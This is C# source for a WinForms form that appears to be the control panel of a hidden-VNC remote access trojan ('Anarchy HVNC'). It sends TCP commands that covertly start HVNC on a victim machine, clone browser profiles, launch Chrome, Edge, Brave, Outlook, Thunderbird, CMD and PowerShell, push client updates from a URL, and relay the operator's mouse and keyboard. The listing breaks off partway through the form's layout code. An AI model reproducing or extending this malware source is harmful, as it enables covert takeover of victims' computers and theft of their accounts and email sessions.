using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.Serialization.Formatters;
using System.Runtime.Serialization.Formatters.Binary;
using System.Threading;
using System.Windows.Forms;
using Guna.UI2.WinForms;
using Microsoft.VisualBasic.CompilerServices;
using Siticone.UI.WinForms;

namespace Anarchy.HCS
{
    public class FrmVNC : Form
    {
        private TcpClient tcpClient_0;

        private int int_0;

        private bool bool_1;

        private bool bool_2;

        public FrmTransfer FrmTransfer0;

        private IContainer components;

        private Guna2ResizeBox guna2ResizeBox1;

        public StatusStrip statusStrip1;

        private ToolStripStatusLabel toolStripStatusLabel3;

        private System.Windows.Forms.Timer timer2;

        private ToolStripStatusLabel toolStripStatusLabel2;

        private ToolStripStatusLabel toolStripStatusLabel1;

        private System.Windows.Forms.Timer timer1;

        private Panel panel4;

        private Guna2TrackBar IntervalScroll;

        private Label IntervalLabel;

        private PictureBox VNCBox;

        private ToolStripSeparator toolStripSeparator1;

        private Label chkClone1;

        private Label QualityLabel;

        private Label ledstatus;

        private SiticoneCirclePictureBox statusled;

        private Guna2Panel guna2Panel2;

        private SiticoneControlBox siticoneControlBox4;

        private SiticoneControlBox siticoneControlBox3;

        private PictureBox pictureBox1;

        private Guna2DragControl guna2DragControl1;

        private Guna2TrackBar ResizeScroll;

        private Guna2TrackBar QualityScroll;

        private Label label2;

        public SiticoneOSToggleSwith ToggleHVNC;

        private Guna2Button fileExplorerToolStripMenuItem;

        private Guna2Button CloseBtn;

        private Label label1;

        public SiticoneOSToggleSwith chkClone;

        private Guna2Button test2ToolStripMenuItem;

        private Guna2Button braveToolStripMenuItem;

        private Guna2Button edgeToolStripMenuItem;

        private Guna2Button test1ToolStripMenuItem;

        private Guna2Button powershellToolStripMenuItem;

        private Guna2Elipse guna2Elipse1;

        private Guna2DragControl guna2DragControl2;

        private Guna2Button guna2Button1;

        private Guna2Button guna2Button2;

        private Guna2Button guna2Button3;

        public PictureBox VNCBoxe
        {
            get
            {
                return this.VNCBox;
            }
            set
            {
                this.VNCBox = value;
            }
        }

        public ToolStripStatusLabel toolStripStatusLabel2_
        {
            get
            {
                return this.toolStripStatusLabel2;
            }
            set
            {
                this.toolStripStatusLabel2 = value;
            }
        }

        public static string labelstatus { get; set; }

        public FrmVNC()
        {
            this.int_0 = 0;
            this.bool_1 = true;
            this.bool_2 = false;
            this.FrmTransfer0 = new FrmTransfer();
            this.InitializeComponent();
            this.VNCBox.MouseEnter += VNCBox_MouseEnter;
            this.VNCBox.MouseLeave += VNCBox_MouseLeave;
            this.VNCBox.KeyPress += VNCBox_KeyPress;
        }

        private void VNCBox_MouseEnter(object sender, EventArgs e)
        {
            this.VNCBox.Focus();
        }

        private void VNCBox_MouseLeave(object sender, EventArgs e)
        {
            base.FindForm().ActiveControl = null;
            base.ActiveControl = null;
        }

        private void VNCBox_KeyPress(object sender, KeyPressEventArgs e)
        {
            this.SendTCP("7*" + Conversions.ToString(e.KeyChar), this.tcpClient_0);
        }

        private void VNCForm_Load(object sender, EventArgs e)
        {
            if (this.FrmTransfer0.IsDisposed)
            {
                this.FrmTransfer0 = new FrmTransfer();
            }
            this.FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(base.Tag);
            this.tcpClient_0 = (TcpClient)base.Tag;
            this.VNCBox.Tag = new Size(1028, 1028);
        }

        public void Check()
        {
            try
            {
                if (this.FrmTransfer0.FileTransferLabele.Text == null)
                {
                    this.toolStripStatusLabel3.Text = "Status";
                }
                else
                {
                    this.toolStripStatusLabel3.Text = this.FrmTransfer0.FileTransferLabele.Text;
                }
            }
            catch
            {
            }
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            checked
            {
                this.int_0 += 100;
                if (this.int_0 >= SystemInformation.DoubleClickTime)
                {
                    this.bool_1 = true;
                    this.bool_2 = false;
                    this.int_0 = 0;
                }
            }
        }

        private void CopyBtn_Click(object sender, EventArgs e)
        {
            this.SendTCP("9*", this.tcpClient_0);
        }

        private void PasteBtn_Click(object sender, EventArgs e)
        {
            try
            {
                this.SendTCP("10*" + Clipboard.GetText(), this.tcpClient_0);
            }
            catch (Exception)
            {
            }
        }

        private void ShowStart_Click(object sender, EventArgs e)
        {
            this.SendTCP("13*", this.tcpClient_0);
        }

        private void VNCBox_MouseDown(object sender, MouseEventArgs e)
        {
            if (this.bool_1)
            {
                this.bool_1 = false;
                this.timer1.Start();
            }
            else if (this.int_0 < SystemInformation.DoubleClickTime)
            {
                this.bool_2 = true;
            }
            Point location;
            location = e.Location;
            object tag;
            tag = this.VNCBox.Tag;
            Size size;
            size = ((tag != null) ? ((Size)tag) : default(Size));
            double num;
            num = (double)this.VNCBox.Width / (double)size.Width;
            double num2;
            num2 = (double)this.VNCBox.Height / (double)size.Height;
            double num3;
            num3 = Math.Ceiling((double)location.X / num);
            double num4;
            num4 = Math.Ceiling((double)location.Y / num2);
            if (this.bool_2)
            {
                if (e.Button == MouseButtons.Left)
                {
                    this.SendTCP("6*" + Conversions.ToString(num3) + "*" + Conversions.ToString(num4), this.tcpClient_0);
                }
            }
            else if (e.Button == MouseButtons.Left)
            {
                this.SendTCP("2*" + Conversions.ToString(num3) + "*" + Conversions.ToString(num4), this.tcpClient_0);
            }
            else if (e.Button == MouseButtons.Right)
            {
                this.SendTCP("3*" + Conversions.ToString(num3) + "*" + Conversions.ToString(num4), this.tcpClient_0);
            }
        }

        private void VNCBox_MouseUp(object sender, MouseEventArgs e)
        {
            Point location;
            location = e.Location;
            object tag;
            tag = this.VNCBox.Tag;
            Size size;
            size = ((tag != null) ? ((Size)tag) : default(Size));
            double num;
            num = (double)this.VNCBox.Width / (double)size.Width;
            double num2;
            num2 = (double)this.VNCBox.Height / (double)size.Height;
            double num3;
            num3 = Math.Ceiling((double)location.X / num);
            double num4;
            num4 = Math.Ceiling((double)location.Y / num2);
            if (e.Button == MouseButtons.Left)
            {
                this.SendTCP("4*" + Conversions.ToString(num3) + "*" + Conversions.ToString(num4), this.tcpClient_0);
            }
            else if (e.Button == MouseButtons.Right)
            {
                this.SendTCP("5*" + Conversions.ToString(num3) + "*" + Conversions.ToString(num4), this.tcpClient_0);
            }
        }

        private void VNCBox_MouseMove(object sender, MouseEventArgs e)
        {
            Point location;
            location = e.Location;
            object tag;
            tag = this.VNCBox.Tag;
            Size size;
            size = ((tag != null) ? ((Size)tag) : default(Size));
            double num;
            num = (double)this.VNCBox.Width / (double)size.Width;
            double num2;
            num2 = (double)this.VNCBox.Height / (double)size.Height;
            double num3;
            num3 = Math.Ceiling((double)location.X / num);
            this.SendTCP(string.Concat(str3: Conversions.ToString(Math.Ceiling((double)location.Y / num2)), str0: "8*", str1: Conversions.ToString(num3), str2: "*"), this.tcpClient_0);
        }

        private void IntervalScroll_Scroll(object sender, EventArgs e)
        {
            this.IntervalLabel.Text = "Interval (ms): " + Conversions.ToString(this.IntervalScroll.Value);
            this.SendTCP("17*" + Conversions.ToString(this.IntervalScroll.Value), this.tcpClient_0);
        }

        private void QualityScroll_Scroll(object sender, EventArgs e)
        {
            this.QualityLabel.Text = "Quality : " + Conversions.ToString(this.QualityScroll.Value) + "%";
            this.SendTCP("18*" + Conversions.ToString(this.QualityScroll.Value), this.tcpClient_0);
        }

        private void ResizeScroll_Scroll(object sender, EventArgs e)
        {
        }

        private void RestoreMaxBtn_Click(object sender, EventArgs e)
        {
            this.SendTCP("15*", this.tcpClient_0);
        }

        private void MinBtn_Click(object sender, EventArgs e)
        {
            this.SendTCP("14*", this.tcpClient_0);
        }

        private void CloseBtn_Click(object sender, EventArgs e)
        {
            this.SendTCP("16*", this.tcpClient_0);
        }

        private void StartExplorer_Click(object sender, EventArgs e)
        {
            this.SendTCP("21*", this.tcpClient_0);
        }

        private void SendTCP(object object_0, TcpClient tcpClient_1)
        {
            checked
            {
                try
                {
                    lock (tcpClient_1)
                    {
                        BinaryFormatter binaryFormatter;
                        binaryFormatter = new BinaryFormatter();
                        binaryFormatter.AssemblyFormat = FormatterAssemblyStyle.Simple;
                        binaryFormatter.TypeFormat = FormatterTypeStyle.TypesAlways;
                        binaryFormatter.FilterLevel = TypeFilterLevel.Full;
                        object objectValue;
                        objectValue = RuntimeHelpers.GetObjectValue(object_0);
                        MemoryStream memoryStream;
                        memoryStream = new MemoryStream();
                        binaryFormatter.Serialize(memoryStream, RuntimeHelpers.GetObjectValue(objectValue));
                        ulong num;
                        num = (ulong)memoryStream.Position;
                        tcpClient_1.GetStream().Write(BitConverter.GetBytes(num), 0, 8);
                        byte[] buffer;
                        buffer = memoryStream.GetBuffer();
                        tcpClient_1.GetStream().Write(buffer, 0, (int)num);
                        memoryStream.Close();
                        memoryStream.Dispose();
                    }
                }
                catch (Exception)
                {
                }
            }
        }

        private void VNCForm_KeyPress(object sender, KeyPressEventArgs e)
        {
            this.SendTCP("7*" + Conversions.ToString(e.KeyChar), this.tcpClient_0);
        }

        private void VNCForm_FormClosing(object sender, FormClosingEventArgs e)
        {
            this.SendTCP("1*", this.tcpClient_0);
            this.VNCBox.Image = null;
            GC.Collect();
            base.Dispose();
            base.Close();
            e.Cancel = true;
        }

        private void VNCForm_Click(object sender, EventArgs e)
        {
            this.method_18(null);
        }

        private void method_18(object object_0)
        {
            base.ActiveControl = (Control)object_0;
        }

        private void button1_Click(object sender, EventArgs e)
        {
        }

        private void timer2_Tick(object sender, EventArgs e)
        {
            this.Check();
        }

        private void closeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (MessageBox.Show("Are you sure ? " + Environment.NewLine + Environment.NewLine + "You lose the connection !", "Close Connection ?", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) == DialogResult.Yes)
            {
                this.SendTCP("24*", this.tcpClient_0);
                base.Close();
            }
        }

        private void button6_Click(object sender, EventArgs e)
        {
        }

        private void button7_Click(object sender, EventArgs e)
        {
            this.SendTCP("4875*", this.tcpClient_0);
        }

        private void button8_Click(object sender, EventArgs e)
        {
            this.SendTCP("4876*", this.tcpClient_0);
        }

        private void IntervalScroll_Scroll(object sender, ScrollEventArgs e)
        {
            this.IntervalLabel.Text = "Interval (ms): " + Conversions.ToString(this.IntervalScroll.Value);
            this.SendTCP("17*" + Conversions.ToString(this.IntervalScroll.Value), this.tcpClient_0);
        }

        private void ResizeScroll_Scroll(object sender, ScrollEventArgs e)
        {
            this.chkClone1.Text = "Resize : " + Conversions.ToString(this.ResizeScroll.Value) + "%";
            this.SendTCP("19*" + Conversions.ToString((double)this.ResizeScroll.Value / 100.0), this.tcpClient_0);
        }

        private void QualityScroll_Scroll(object sender, ScrollEventArgs e)
        {
            this.QualityLabel.Text = "HQ : " + Conversions.ToString(this.QualityScroll.Value) + "%";
            this.SendTCP("18*" + Conversions.ToString(this.QualityScroll.Value), this.tcpClient_0);
        }

        private void guna2Button2_Click(object sender, EventArgs e)
        {
            if (MessageBox.Show("Are you sure ? " + Environment.NewLine + Environment.NewLine + "You lose the connection !", "Close Connexion ?", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) == DialogResult.Yes)
            {
                this.SendTCP("24*", this.tcpClient_0);
                base.Close();
            }
        }

        private void VNCBox_MouseHover(object sender, EventArgs e)
        {
            this.VNCBox.Focus();
        }

        private void guna2Button3_Click(object sender, EventArgs e)
        {
            if (MessageBox.Show("Are you sure ? " + Environment.NewLine + Environment.NewLine + "You lose the connection !", "Close Connection ?", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) == DialogResult.Yes)
            {
                base.Close();
            }
        }

        private void fileExplorerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            this.SendTCP("21*", this.tcpClient_0);
        }

        private void powershellToolStripMenuItem_Click(object sender, EventArgs e)
        {
            this.SendTCP("4876*", this.tcpClient_0);
        }

        private void cMDToolStripMenuItem_Click(object sender, EventArgs e)
        {
            this.SendTCP("4875*", this.tcpClient_0);
        }

        private void windowsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            this.SendTCP("13*", this.tcpClient_0);
        }

        private void test1ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.chkClone.Checked)
            {
                if (this.FrmTransfer0.IsDisposed)
                {
                    this.FrmTransfer0 = new FrmTransfer();
                }
                this.FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(base.Tag);
                this.FrmTransfer0.Hide();
                this.SendTCP("11*" + Conversions.ToString(Value: true), (TcpClient)base.Tag);
            }
            else
            {
                this.SendTCP("11*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
            }
        }

        private void test2ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.chkClone.Checked)
            {
                if (this.FrmTransfer0.IsDisposed)
                {
                    this.FrmTransfer0 = new FrmTransfer();
                }
                this.FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(base.Tag);
                this.FrmTransfer0.Hide();
                this.SendTCP("12*" + Conversions.ToString(Value: true), (TcpClient)base.Tag);
            }
            else
            {
                this.SendTCP("12*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
            }
        }

        private void braveToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.chkClone.Checked)
            {
                if (this.FrmTransfer0.IsDisposed)
                {
                    this.FrmTransfer0 = new FrmTransfer();
                }
                this.FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(base.Tag);
                this.FrmTransfer0.Hide();
                this.SendTCP("32*" + Conversions.ToString(Value: true), (TcpClient)base.Tag);
            }
            else
            {
                this.SendTCP("32*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
            }
        }

        private void edgeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.chkClone.Checked)
            {
                if (this.FrmTransfer0.IsDisposed)
                {
                    this.FrmTransfer0 = new FrmTransfer();
                }
                this.FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(base.Tag);
                this.FrmTransfer0.Hide();
                this.SendTCP("30*" + Conversions.ToString(Value: true), (TcpClient)base.Tag);
            }
            else
            {
                this.SendTCP("30*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
            }
        }

        public void hURL(string url)
        {
            this.SendTCP("8585* " + url, (TcpClient)base.Tag);
        }

        public void UpdateClient(string url)
        {
            this.SendTCP("8589* " + url, (TcpClient)base.Tag);
        }

        public void CloseClient()
        {
            this.SendTCP("24*", (TcpClient)base.Tag);
        }

        public void ResetScale()
        {
            this.SendTCP("8587*", (TcpClient)base.Tag);
        }

        public void KillChrome()
        {
            this.SendTCP("8586*", (TcpClient)base.Tag);
        }

        private void exportbtn_Click(object sender, EventArgs e)
        {
        }

        private void copyToolStripMenuItem_Click(object sender, EventArgs e)
        {
            this.SendTCP("3307*", this.tcpClient_0);
        }

        private void pasteToolStripMenuItem_Click(object sender, EventArgs e)
        {
            this.SendTCP("3306*" + Clipboard.GetText(), (TcpClient)base.Tag);
        }

        private void ToggleHVNC_CheckedChanged(object sender, EventArgs e)
        {
            if (this.ToggleHVNC.Checked)
            {
                this.SendTCP("0*", this.tcpClient_0);
                this.FrmTransfer0.FileTransferLabele.Text = "HVNC Started!";
            }
            else if (!this.ToggleHVNC.Checked)
            {
                this.SendTCP("1*", this.tcpClient_0);
                this.VNCBox.Image = null;
                this.FrmTransfer0.FileTransferLabele.Text = "HVNC Stopped!";
                GC.Collect();
            }
        }

        private void toolStripStatusLabel3_TextChanged(object sender, EventArgs e)
        {
            FrmVNC.labelstatus = this.FrmTransfer0.FileTransferLabele.Text;
            if (FrmVNC.labelstatus == "Idle")
            {
                this.statusled.FillColor = Color.White;
            }
            else if (FrmVNC.labelstatus.Contains("MB"))
            {
                this.ledstatus.Text = "Cloning Profile...";
                this.statusled.FillColor = Color.Yellow;
            }
            else if (FrmVNC.labelstatus.Contains("initiated"))
            {
                this.ledstatus.Text = "Profile Cloned";
                this.statusled.FillColor = Color.FromArgb(4, 143, 110);
            }
        }

        private void chkClone_CheckedChanged(object sender, EventArgs e)
        {
        }

        private void exodos_Click(object sender, EventArgs e)
        {
            this.SendTCP("1980*", this.tcpClient_0);
        }

        private void guna2Button2_Click_1(object sender, EventArgs e)
        {
            this.SendTCP("3308*", (TcpClient)base.Tag);
            Thread.Sleep(500);
        }

        private void guna2Button2_Click_2(object sender, EventArgs e)
        {
            this.SendTCP("555*", this.tcpClient_0);
        }

        private void guna2Button3_Click_1(object sender, EventArgs e)
        {
            this.SendTCP("557*", this.tcpClient_0);
        }

        protected override void Dispose(bool disposing)
        {
            if (disposing && this.components != null)
            {
                this.components.Dispose();
            }
            base.Dispose(disposing);
        }

        private void InitializeComponent()
        {
            this.components = new System.ComponentModel.Container();
            
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(FrmVNC));
            this.guna2ResizeBox1 = new Guna.UI2.WinForms.Guna2ResizeBox();
            this.timer2 = new System.Windows.Forms.Timer(this.components);
            this.toolStripStatusLabel2 = new System.Windows.Forms.ToolStripStatusLabel();
            this.toolStripStatusLabel1 = new System.Windows.Forms.ToolStripStatusLabel();
            this.toolStripStatusLabel3 = new System.Windows.Forms.ToolStripStatusLabel();
            this.statusStrip1 = new System.Windows.Forms.StatusStrip();
            this.timer1 = new System.Windows.Forms.Timer(this.components);
            this.IntervalLabel = new System.Windows.Forms.Label();
            this.IntervalScroll = new Guna.UI2.WinForms.Guna2TrackBar();
            this.panel4 = new System.Windows.Forms.Panel();
            this.guna2Button3 = new Guna.UI2.WinForms.Guna2Button();
            this.guna2Button2 = new Guna.UI2.WinForms.Guna2Button();
            this.guna2Button1 = new Guna.UI2.WinForms.Guna2Button();
            this.label1 = new System.Windows.Forms.Label();
            this.chkClone = new Siticone.UI.WinForms.SiticoneOSToggleSwith();
            this.test2ToolStripMenuItem = new Guna.UI2.WinForms.Guna2Button();
            this.braveToolStripMenuItem = new Guna.UI2.WinForms.Guna2Button();
            this.edgeToolStripMenuItem = new Guna.UI2.WinForms.Guna2Button();
            this.test1ToolStripMenuItem = new Guna.UI2.WinForms.Guna2Button();
            this.powershellToolStripMenuItem = new Guna.UI2.WinForms.Guna2Button();
            this.fileExplorerToolStripMenuItem = new Guna.UI2.WinForms.Guna2Button();
            this.CloseBtn = new Guna.UI2.WinForms.Guna2Button();
            this.statusled = new Siticone.UI.WinForms.SiticoneCirclePictureBox();
            this.ledstatus = new System.Windows.Forms.Label();
            this.chkClone1 = new System.Windows.Forms.Label();
            this.QualityLabel = new System.Windows.Forms.Label();
            this.VNCBox = new System.Windows.Forms.PictureBox();
            this.toolStripSeparator1 = new System.Windows.Forms.ToolStripSeparator();
            this.guna2Panel2 = new Guna.UI2.WinForms.Guna2Panel();
            this.ToggleHVNC = new Siticone.UI.WinForms.SiticoneOSToggleSwith();
            this.label2 = new System.Windows.Forms.Label();
            this.ResizeScroll = new Guna.UI2.WinForms.Guna2TrackBar();
            this.QualityScroll = new Guna.UI2.WinForms.Guna2TrackBar();
            this.pictureBox1 = new System.Windows.Forms.PictureBox();
            this.siticoneControlBox4 = new Siticone.UI.WinForms.SiticoneControlBox();
            this.siticoneControlBox3 = new Siticone.UI.WinForms.SiticoneControlBox();
            this.guna2DragControl1 = new Guna.UI2.WinForms.Guna2DragControl(this.components);
            this.guna2Elipse1 = new Guna.UI2.WinForms.Guna2Elipse(this.components);
            this.guna2DragControl2 = new Guna.UI2.WinForms.Guna2DragControl(this.components);
            this.statusStrip1.SuspendLayout();
            this.panel4.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)this.statusled).BeginInit();
            ((System.ComponentModel.ISupportInitialize)this.VNCBox).BeginInit();
            this.guna2Panel2.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)this.pictureBox1).BeginInit();
            base.SuspendLayout();
            this.guna2ResizeBox1.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
            this.guna2ResizeBox1.BackColor = System.Drawing.Color.FromArgb(24, 24, 24);
            this.guna2ResizeBox1.FillColor = System.Drawing.Color.Gainsboro;
            this.guna2ResizeBox1.ForeColor = System.Drawing.Color.Black;
            this.guna2ResizeBox1.Location = new System.Drawing.Point(1241, 755);
            this.guna2ResizeBox1.Name = "guna2ResizeBox1";
            this.guna2ResizeBox1.Size = new System.Drawing.Size(20, 20);
            this.guna2ResizeBox1.TabIndex = 35;
            this.guna2ResizeBox1.TargetControl = this;
            this.timer2.Enabled = true;
            this.timer2.Interval = 1000;
            this.timer2.Tick += new System.EventHandler(timer2_Tick);
            this.toolStripStatusLabel2.Name = "toolStripStatusLabel2";
            this.toolStripStatusLabel2.Size = new System.Drawing.Size(26, 17);
            this.toolStripStatusLabel2.Text = "Idle";
            this.toolStripStatusLabel1.Name = "toolStripStatusLabel1";
            this.toolStripStatusLabel1.Size = new System.Drawing.Size(44, 17);
            this.toolStripStatusLabel1.Text = "Statut :";
            this.toolStripStatusLabel3.ForeColor = System.Drawing.Color.Gainsboro;
            this.toolStripStatusLabel3.Name = "toolStripStatusLabel3";
            this.toolStripStatusLabel3.Size = new System.Drawing.Size(39, 17);
            this.toolStripStatusLabel3.Text = "Status";
            this.toolStripStatusLabel3.Visible = false;
            this.toolStripStatusLabel3.TextChanged += new System.EventHandler(toolStripStatusLabel3_TextChanged);
            this.statusStrip1.BackColor = System.Drawing.Color.FromArgb(24, 24, 24);
            this.statusStrip1.GripStyle = System.Windows.Forms.ToolStripGripStyle.Visible;
            this.statusStrip1.ImageScalingSize = new System.Drawing.Size(20, 20);
            this.statusStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[1] { this.toolStripStatusLabel3 });
            this.statusStrip1.Location = new System.Drawing.Point(0, 753);
            this.statusStrip1.Name = "statusStrip1";
            this.statusStrip1.Size = new System.Drawing.Size(1261, 22);
            this.statusStrip1.TabIndex = 19;
            this.timer1.Tick += new System.EventHandler(timer1_Tick);
            this.IntervalLabel.Anchor = System.Windows.Forms.AnchorStyles.Top;
            this.IntervalLabel.AutoSize = true;
            this.IntervalLabel.ForeColor = System.Drawing.Color.Gainsboro;
            this.IntervalLabel.Location = new System.Drawing.Point(-61, 104);
            this.IntervalLabel.Name = "IntervalLabel";
            this.IntervalLabel.Size = new System.Drawing.Size(88, 13);
            this.IntervalLabel.TabIndex = 6;
            this.IntervalLabel.Text = "Interval (ms): 500";
            this.IntervalLabel.Visible = false;
            this.IntervalScroll.Anchor = System.Windows.Forms.AnchorStyles.Top;
            this.IntervalScroll.Location = new System.Drawing.Point(33, 105);
            this.IntervalScroll.Maximum = 1000;
            this.IntervalScroll.Name = "IntervalScroll";
            this.IntervalScroll.Size = new System.Drawing.Size(46, 26);
            this.IntervalScroll.TabIndex = 8;
            this.IntervalScroll.ThumbColor = System.Drawing.Color.FromArgb(58, 97, 128);
            this.IntervalScroll.Value = 500;
            this.IntervalScroll.Visible = false;
            this.IntervalScroll.Scroll += new System.Windows.Forms.ScrollEventHandler(IntervalScroll_Scroll);
            this.panel4.BackColor = System.Drawing.Color.FromArgb(24, 24, 24);
            this.panel4.Controls.Add(this.guna2Button3);
            this.panel4.Controls.Add(this.guna2Button2);
            this.panel4.Controls.Add(this.guna2Button1);
            this.panel4.Controls.Add(this.label1);
            this.panel4.Controls.Add(this.chkClone);
            this.panel4.Controls.Add(this.test2ToolStripMenuItem);
            this.panel4.Controls.Add(this.braveToolStripMenuItem);
            this.panel4.Controls.Add(this.edgeToolStripMenuItem);
            this.panel4.Controls.Add(this.test1ToolStripMenuItem);
            this.panel4.Controls.Add(this.powershellToolStripMenuItem);
            this.panel4.Controls.Add(this.fileExplorerToolStripMenuItem);
            this.panel4.Controls.Add(this.CloseBtn);
            this.panel4.Controls.Add(this.statusled);
            this.panel4.Controls.Add(this.ledstatus);
            this.panel4.Controls.Add(this.IntervalScroll);
            this.panel4.Controls.Add(this.IntervalLabel);
            this.panel4.Dock = System.Windows.Forms.DockStyle.Bottom;
            this.panel4.Location = new System.Drawing.Point(0, 687);
            this.panel4.Name = "panel4";
            this.panel4.Size = new System.Drawing.Size(1261, 66);
            this.panel4.TabIndex = 39;
            this.guna2Button3.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
            this.guna2Button3.BackColor = System.Drawing.Color.Transparent;
            this.guna2Button3.BorderRadius = 8;
            this.guna2Button3.FillColor = System.Drawing.Color.FromArgb(27, 27, 27);
            this.guna2Button3.Font = new System.Drawing.Font("Segoe UI", 9f);
            this.guna2Button3.ForeColor = System.Drawing.Color.White;
            this.guna2Button3.Image = (System.Drawing.Image)resources.GetObject("guna2Button3.Image");
            this.guna2Button3.Location = new System.Drawing.Point(499, 36);
            this.guna2Button3.Name = "guna2Button3";
            this.guna2Button3.PressedColor = System.Drawing.Color.FromArgb(224, 224, 224);
            this.guna2Button3.ShadowDecoration.BorderRadius = 10;
            this.guna2Button3.ShadowDecoration.Color = System.Drawing.Color.Gray;
            this.guna2Button3.ShadowDecoration.Depth = 10;
            this.guna2Button3.ShadowDecoration.Enabled = true;
            this.guna2Button3.Size = new System.Drawing.Size(116, 25);
            this.guna2Button3.TabIndex = 206;
            this.guna2Button3.Text = "Thunderbird";
            this.guna2Button3.Click += new System.EventHandler(guna2Button3_Click_1);
            this.guna2Button2.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
            this.guna2Button2.BackColor = System.Drawing.Color.Transparent;
            this.guna2Button2.BorderRadius = 8;
            this.guna2Button2.FillColor = System.Drawing.Color.FromArgb(27, 27, 27);
            this.guna2Button2.Font = new System.Drawing.Font("Segoe UI", 9f);
            this.guna2Button2.ForeColor = System.Drawing.Color.White;
            this.guna2Button2.Image = (System.Drawing.Image)resources.GetObject("guna2Button2.Image");
            this.guna2Button2.Location = new System.Drawing.Point(499, 6);
            this.guna2Button2.Name = "guna2Button2";
            this.guna2Button2.PressedColor = System.Drawing.Color.FromArgb(224, 224, 224);
            this.guna2Button2.ShadowDecoration.BorderRadius = 10;
            this.guna2Button2.ShadowDecoration.Color = System.Drawing.Color.Gray;
            this.guna2Button2.ShadowDecoration.Depth = 10;
            this.guna2Button2.ShadowDecoration.Enabled = true;
            this.guna2Button2.Size = new System.Drawing.Size(116, 25);
            this.guna2Button2.TabIndex = 205;
            this.guna2Button2.Text = "Outlook";
            this.guna2Button2.Click += new System.EventHandler(guna2Button2_Click_2);
            this.guna2Button1.BackColor = System.Drawing.Color.Transparent;
            this.guna2Button1.BorderRadius = 8;
            this.guna2Button1.FillColor = System.Drawing.Color.FromArgb(27, 27, 27);
            this.guna2Button1.Font = new System.Drawing.Font("Segoe UI", 9f);
            this.guna2Button1.ForeColor = System.Drawing.Color.White;
            this.guna2Button1.Image = (System.Drawing.Image)resources.GetObject("guna2Button1.Image");
            this.guna2Button1.Location = new System.Drawing.Point(205, 10);
            this.guna2Button1.Name = "guna2Button1";
            this.guna2Button1.PressedColor = System.Drawing.Color.FromArgb(224, 224, 224);
            this.guna2Button1.ShadowDecoration.BorderRadius = 8;
            this.guna2Button1.ShadowDecoration.Color = System.Drawing.Color.Gray;
            this.guna2Button1.ShadowDecoration.Depth = 10;
            this.guna2Button1.ShadowDecoration.Enabled = true;
            this.guna2Button1.Size = new System.Drawing.Size(111, 20);
            this.guna2Button1.TabIndex = 204;
            this.guna2Button1.Text = "CMD";
            this.guna2Button1.Click += new System.EventHandler(cMDToolStripMenuItem_Click);
            this.label1.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
            this.label1.AutoSize = true;
            this.label1.Font = new System.Drawing.Font("Hack", 8.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
            this.label1.ForeColor = System.Drawing.Color.White;
            this.label1.Location = new System.Drawing.Point(1088, 13);
            this.label1.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.label1.Name = "label1";
            this.label1.Size = new System.Drawing.Size(105, 13);
            this.label1.TabIndex = 198;
            this.label1.Text = "Clone Profile:";
            this.chkClone.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
            this.chkClone.BackColor = System.Drawing.Color.FromArgb(24, 24, 24);
            this.chkClone.CheckedFillColor = System.Drawing.Color.FromArgb(24, 24, 24);
            this.chkClone.Location = new System.Drawing.Point(1199, 8);
            this.chkClone.Name = "chkClone";
            this.chkClone.Size = new System.Drawing.Size(53, 22);
            this.chkClone.TabIndex = 203;
            this.chkClone.CheckedChanged += new System.EventHandler(chkClone_CheckedChanged);
            this.test2ToolStripMenuItem.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
            this.test2ToolStripMenuItem.BackColor = System.Drawing.Color.Transparent;
            this.test2ToolStripMenuItem.BorderRadius = 8;
            this.test2ToolStripMenuItem.FillColor = System.Drawing.Color.FromArgb(27, 27, 27);
            this.test2ToolStripMenuItem.Font = new System.Drawing.Font("Segoe UI", 9f);
            this.test2ToolStripMenuItem.ForeColor = System.Drawing.Color.White;
            this.test2ToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("test2ToolStripMenuItem.Image");
            this.test2ToolStripMenuItem.Location = new System.Drawing.Point(972, 15);
            this.test2ToolStripMenuItem.Name = "test2ToolStripMenuItem";
            this.test2ToolStripMenuItem.PressedColor = System.Drawing.Color.FromArgb(224, 224, 224);
            this.test2ToolStripMenuItem.ShadowDecoration.BorderRadius = 10;
            this.test2ToolStripMenuItem.ShadowDecoration.Color = System.Drawing.Color.Gray;
            this.test2ToolStripMenuItem.ShadowDecoration.Depth = 10;
            this.test2ToolStripMenuItem.ShadowDecoration.Enabled = true;
            this.test2ToolStripMenuItem.Size = new System.Drawing.Size(111, 40);
            this.test2ToolStripMenuItem.TabIndex = 202;
